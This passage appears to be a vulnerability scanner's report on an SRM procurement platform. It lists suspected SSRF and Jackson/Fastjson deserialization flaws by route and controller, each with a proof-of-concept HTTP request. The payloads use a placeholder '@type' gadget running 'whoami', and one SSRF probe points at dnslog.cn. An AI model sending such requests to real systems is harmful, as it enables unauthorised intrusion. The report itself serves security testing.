+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyRelationOrgController: org.springframework.http.ResponseEntity autoBuildThirdPartyRelation(java.lang.Long,java.lang.String,java.lang.Long,java.util.Map)>
+==================================================
+POST /v1/123/third-party-relations/auto-bind HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"key": {"@type":"com.example.Evil","cmd":"whoami"}}
+
+
+==================================================
+Vulnerability: SSRF
+Sink: <java.net.URL: void <init>(java.lang.String)>
+Route: GET /v1/get-picture/base64
+Source: <org.srm.mobile.config.api.controller.v1.mall.MallCodeController: org.springframework.http.ResponseEntity getPictureBase64(java.lang.String)>
+==================================================
+GET /v1/get-picture/base64 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg0=http%3A%2F%2Fdnslog.cn
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/cnf-actions
+Source: <org.srm.platform.api.controller.v1.CnfActionController: org.springframework.http.ResponseEntity create(java.lang.Long,org.srm.platform.domain.entity.CnfAction)>
+==================================================
+POST /v1/123/cnf-actions HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.CnfAction",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: PUT /v1/{organizationId}/cnf-actions
+Source: <org.srm.platform.api.controller.v1.CnfActionController: org.springframework.http.ResponseEntity update(java.lang.Long,org.srm.platform.domain.entity.CnfAction)>
+==================================================
+PUT /v1/123/cnf-actions HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.CnfAction",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: GET /v1/company-actions/{organizationId}/submited-for-tenant
+Source: <org.srm.platform.api.controller.v1.CompanyActionController: org.springframework.http.ResponseEntity querySubmitedCompanyActionTenant(org.srm.platform.api.dto.CompanyActionDTO,io.choerodon.mybatis.pagehelper.domain.PageRequest,java.lang.Long)>
+==================================================
+GET /v1/company-actions/123/submited-for-tenant HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg0=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/company-ca-auth-info/to_pay_notify
+Source: <org.srm.platform.api.controller.v1.CompanyCaAuthInfoController: org.springframework.http.ResponseEntity toPayNotify(java.lang.Long,javax.servlet.http.HttpServletRequest,org.srm.platform.domain.vo.ToPayResultVO)>
+==================================================
+POST /v1/123/company-ca-auth-info/to_pay_notify HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg2=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/{organizationId}/company-ca-auth-info/to_pay_notify
+Source: <org.srm.platform.api.controller.v1.CompanyCaAuthInfoController: org.springframework.http.ResponseEntity toPayNotify(java.lang.Long,javax.servlet.http.HttpServletRequest,org.srm.platform.domain.vo.ToPayResultVO)>
+==================================================
+POST /v1/123/company-ca-auth-info/to_pay_notify HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg2=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/company-ca-auth-info/to_pay_notify
+Source: <org.srm.platform.api.controller.v1.CompanyCaAuthInfoController: org.springframework.http.ResponseEntity toPayNotify(java.lang.Long,javax.servlet.http.HttpServletRequest,org.srm.platform.domain.vo.ToPayResultVO)>
+==================================================
+POST /v1/123/company-ca-auth-info/to_pay_notify HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg2=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: GET /v1/{organizationId}/dashboard_clause/getClauseCount
+Source: <org.srm.platform.api.controller.v1.DashboardClauseController: java.util.List QueryDashboardClause(java.lang.Long,java.lang.String)>
+==================================================
+GET /v1/123/dashboard_clause/getClauseCount HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: GET /v1/{organizationId}/dashboard_clause/getClauseCount
+Source: <org.srm.platform.api.controller.v1.DashboardClauseController: java.util.List QueryDashboardClause(java.lang.Long,java.lang.String)>
+==================================================
+GET /v1/123/dashboard_clause/getClauseCount HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: GET /v1/{organizationId}/dashboard_clause/getClauseCount
+Source: <org.srm.platform.api.controller.v1.DashboardClauseController: java.util.List QueryDashboardClause(java.lang.Long,java.lang.String)>
+==================================================
+GET /v1/123/dashboard_clause/getClauseCount HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: GET /v1/{organizationId}/dashboard_clause/test
+Source: <org.srm.platform.api.controller.v1.DashboardClauseController: java.util.List testfeignQueryDashboardClauseMap(java.lang.String)>
+==================================================
+GET /v1/123/dashboard_clause/test HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg0=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: GET /v1/{organizationId}/dashboard_clause/test
+Source: <org.srm.platform.api.controller.v1.DashboardClauseController: java.util.List testfeignQueryDashboardClauseMap(java.lang.String)>
+==================================================
+GET /v1/123/dashboard_clause/test HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg0=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: GET /v1/{organizationId}/dashboard_clause/test
+Source: <org.srm.platform.api.controller.v1.DashboardClauseController: java.util.List testfeignQueryDashboardClauseMap(java.lang.String)>
+==================================================
+GET /v1/123/dashboard_clause/test HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg0=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/doc-deliver-records/deliver-to
+Source: <org.srm.platform.api.controller.v1.DocDeliverRecordController: org.springframework.http.ResponseEntity deliverTo(java.lang.Long,java.lang.String,org.srm.platform.domain.entity.DocDeliverRecord)>
+==================================================
+POST /v1/123/doc-deliver-records/deliver-to HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.DocDeliverRecord",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/{organizationId}/doc-deliver-records/deliver-to
+Source: <org.srm.platform.api.controller.v1.DocDeliverRecordController: org.springframework.http.ResponseEntity deliverTo(java.lang.Long,java.lang.String,org.srm.platform.domain.entity.DocDeliverRecord)>
+==================================================
+POST /v1/123/doc-deliver-records/deliver-to HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.DocDeliverRecord",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/doc-deliver-records/deliver-to
+Source: <org.srm.platform.api.controller.v1.DocDeliverRecordController: org.springframework.http.ResponseEntity deliverTo(java.lang.Long,java.lang.String,org.srm.platform.domain.entity.DocDeliverRecord)>
+==================================================
+POST /v1/123/doc-deliver-records/deliver-to HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.DocDeliverRecord",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/doc-deliver-records/deliver-to
+Source: <org.srm.platform.api.controller.v1.DocDeliverRecordController: org.springframework.http.ResponseEntity deliverTo(java.lang.Long,java.lang.String,org.srm.platform.domain.entity.DocDeliverRecord)>
+==================================================
+POST /v1/123/doc-deliver-records/deliver-to HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.DocDeliverRecord",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: PUT /v1/{organizationId}/event-messages
+Source: <org.srm.platform.api.controller.v1.EventMessageOrgController: boolean reSend(org.srm.platform.domain.entity.EventMessage,java.lang.Long)>
+==================================================
+PUT /v1/123/event-messages HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.EventMessage",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: PUT /v1/{organizationId}/event-messages
+Source: <org.srm.platform.api.controller.v1.EventMessageOrgController: boolean reSend(org.srm.platform.domain.entity.EventMessage,java.lang.Long)>
+==================================================
+PUT /v1/123/event-messages HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.EventMessage",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: PUT /v1/{organizationId}/event-messages
+Source: <org.srm.platform.api.controller.v1.EventMessageOrgController: boolean reSend(org.srm.platform.domain.entity.EventMessage,java.lang.Long)>
+==================================================
+PUT /v1/123/event-messages HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.EventMessage",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: PUT /v1/event-messages
+Source: <org.srm.platform.api.controller.v1.EventMessageSiteController: boolean reSend(org.srm.platform.domain.entity.EventMessage)>
+==================================================
+PUT /v1/event-messages HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.EventMessage",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: PUT /v1/event-messages
+Source: <org.srm.platform.api.controller.v1.EventMessageSiteController: boolean reSend(org.srm.platform.domain.entity.EventMessage)>
+==================================================
+PUT /v1/event-messages HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.EventMessage",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: PUT /v1/event-messages
+Source: <org.srm.platform.api.controller.v1.EventMessageSiteController: boolean reSend(org.srm.platform.domain.entity.EventMessage)>
+==================================================
+PUT /v1/event-messages HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.domain.entity.EventMessage",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/fdd/event/notify
+Source: <org.srm.platform.api.controller.v1.FddEventNotifyController: org.springframework.http.ResponseEntity commonNotify(org.springframework.http.HttpHeaders,java.lang.String)>
+==================================================
+POST /v1/fdd/event/notify HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg0=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/hr/employees
+Source: <org.srm.platform.api.controller.v1.HrController: org.springframework.http.ResponseEntity batchCreateOrUpdateEmployee(java.lang.Long,java.util.List)>
+==================================================
+POST /v1/123/hr/employees HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/{organizationId}/hr/employees
+Source: <org.srm.platform.api.controller.v1.HrController: org.springframework.http.ResponseEntity batchCreateOrUpdateEmployee(java.lang.Long,java.util.List)>
+==================================================
+POST /v1/123/hr/employees HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/hr/employees
+Source: <org.srm.platform.api.controller.v1.HrController: org.springframework.http.ResponseEntity batchCreateOrUpdateEmployee(java.lang.Long,java.util.List)>
+==================================================
+POST /v1/123/hr/employees HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/hr/positions
+Source: <org.srm.platform.api.controller.v1.HrController: org.springframework.http.ResponseEntity batchCreateOrUpdatePosition(java.lang.Long,java.util.List)>
+==================================================
+POST /v1/123/hr/positions HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/{organizationId}/hr/positions
+Source: <org.srm.platform.api.controller.v1.HrController: org.springframework.http.ResponseEntity batchCreateOrUpdatePosition(java.lang.Long,java.util.List)>
+==================================================
+POST /v1/123/hr/positions HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/hr/positions
+Source: <org.srm.platform.api.controller.v1.HrController: org.springframework.http.ResponseEntity batchCreateOrUpdatePosition(java.lang.Long,java.util.List)>
+==================================================
+POST /v1/123/hr/positions HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/invites
+Source: <org.srm.platform.api.controller.v1.PartnerInviteController: org.springframework.http.ResponseEntity list(java.lang.Long,org.srm.platform.api.dto.PartnerInviteParamDTO,io.choerodon.mybatis.pagehelper.domain.PageRequest)>
+==================================================
+POST /v1/123/invites HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.api.dto.PartnerInviteParamDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: GET /v1/{organizationId}/invites/export
+Source: <org.srm.platform.api.controller.v1.PartnerInviteController: org.springframework.http.ResponseEntity listExport(java.lang.Long,org.srm.platform.api.dto.PartnerInviteParamDTO,org.hzero.export.vo.ExportParam,javax.servlet.http.HttpServletResponse,io.choerodon.mybatis.pagehelper.domain.PageRequest)>
+==================================================
+GET /v1/123/invites/export HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg2=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg3=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D&arg4=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/supplier-invite
+Source: <org.srm.platform.api.controller.v1.PartnerInviteController: org.springframework.http.ResponseEntity supplierInvite(java.lang.Long,org.srm.platform.api.dto.PartnerInviteDTO)>
+==================================================
+POST /v1/123/supplier-invite HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.api.dto.PartnerInviteDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/supplier-invite-register
+Source: <org.srm.platform.api.controller.v1.SupplierInviteRegistrationController: org.springframework.http.ResponseEntity create(java.lang.Long,org.srm.platform.api.dto.SupplierInviteRegDTO)>
+==================================================
+POST /v1/123/supplier-invite-register HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.platform.api.dto.SupplierInviteRegDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/wide-area-sourcing/invite
+Source: <org.srm.platform.api.controller.v1.WideAreaSourcingController: org.springframework.http.ResponseEntity invite(java.lang.Long,org.srm.amkt.client.api.dto.SourceInviteTrackingDTO)>
+==================================================
+POST /v1/123/wide-area-sourcing/invite HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.amkt.client.api.dto.SourceInviteTrackingDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: GET /v1/{organizationId}/wide-area-sourcing/goods
+Source: <org.srm.platform.api.controller.v1.WideAreaSourcingController: org.springframework.http.ResponseEntity queryGoods(java.lang.Long,org.srm.amkt.client.api.dto.bw.BwKeywordSearchDTO)>
+==================================================
+GET /v1/123/wide-area-sourcing/goods HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+
+arg1=%7B%22%40type%22%3A%22com.example.Evil%22%2C%22cmd%22%3A%22whoami%22%7D
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/wide-area-sourcing/supplier
+Source: <org.srm.platform.api.controller.v1.WideAreaSourcingController: org.springframework.http.ResponseEntity querySupplier(java.lang.Long,org.srm.amkt.client.api.dto.bw.BwQuerySupplierNameDTO)>
+==================================================
+POST /v1/123/wide-area-sourcing/supplier HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.amkt.client.api.dto.bw.BwQuerySupplierNameDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
